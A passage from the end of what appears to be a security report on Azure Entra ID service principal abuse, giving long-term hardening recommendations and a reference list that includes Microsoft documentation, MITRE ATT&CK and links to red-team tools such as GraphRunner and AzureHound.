4. **Establish Service Principal Governance** – Define ownership, approval process, lifecycle management

### Long-Term (90+ Days)

1. **Managed Identities** – Replace service principals with managed identities (Azure VMs, Functions)
2. **Workload Identity Federation** – Eliminate shared secrets entirely; use OpenID Connect
3. **Passwordless Authentication** – For humans; for service principals use certificates + key rotation
4. **Zero Trust** – Assume breach; implement strict access controls and monitoring

---

## 14. REFERENCES & FURTHER READING

- [MITRE ATT&CK T1550.001 - Application Access Token](https://attack.mitre.org/techniques/T1550/001/)
- [Microsoft Learn - Service Principals in Entra ID](https://learn.microsoft.com/en-us/entra/identity-platform/app-objects-and-service-principals)
- [Microsoft Graph API Documentation](https://docs.microsoft.com/en-us/graph/api/overview)
- [Azure OAuth 2.0 Client Credentials Flow](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-client-creds-grant-flow)
- [GraphRunner - Microsoft Graph Exploitation](https://github.com/dorkostyle/GraphRunner)
- [AzureHound - Entra ID Reconnaissance](https://github.com/BloodHoundAD/AzureHound)
- [The Hacker Recipes - Service Principal Abuse](https://www.thehacker.recipes/cloud/entra-id/lateral-movement/service-principal)
- [Security Best Practices for Azure Service Principals](https://learn.microsoft.com/en-us/entra/identity-platform/security-best-practices-for-app-registration)

---
